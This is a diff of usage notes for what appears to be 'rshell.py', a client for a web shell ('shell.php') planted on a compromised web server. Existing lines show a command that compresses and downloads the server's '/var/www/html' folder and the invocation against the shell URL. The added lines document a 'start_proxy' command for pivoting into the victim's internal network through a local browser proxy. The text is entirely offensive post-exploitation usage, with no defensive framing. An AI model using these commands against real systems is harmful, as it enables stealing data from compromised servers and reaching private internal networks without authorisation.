@@ -44,4 +44,9 @@
 		#Compress and download a folder
 		rshell:~ dwfolder /var/www/html
 
+		#Start a proxy to pivot to the internal network
+		#You have to configure your browser proxy settings to localhost:8888
+		rshell:~ start_proxy
+
 	* python rshell.py -u http://127.0.0.1/shell.php -p proxy:port
+
